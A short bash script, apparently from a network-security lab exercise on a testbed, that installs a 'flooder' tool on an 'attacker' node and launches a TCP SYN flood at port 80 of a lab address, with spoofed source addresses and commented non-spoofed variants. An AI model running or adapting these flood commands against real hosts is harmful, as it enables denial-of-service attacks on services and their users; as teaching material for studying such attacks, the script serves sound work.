#!/bin/bash

# On attacker
/share/education/TCPSYNFlood_USC_ISI/install-flooder

read -r -p "Press Enter to continue..."
sudo flooder --dst 5.6.7.8 --src 1.1.2.0 --srcmask 255.255.255.0 --highrate 1000 --lowrate 1000 --proto 6 --dportmin 80 --dportmax 80

# NO SPOOFER
# sudo flooder --dst 5.6.7.8 --highrate 100 --lowrate 100 --proto 6 --dportmin 80 --dportmax 80

# NO SPOOFER, WITH SRC
# sudo flooder --dst 2.0.1.2 --highrate 100 --lowrate 100 --proto 6 --dportmin 80 --dportmax 80 --src 2.0.1.1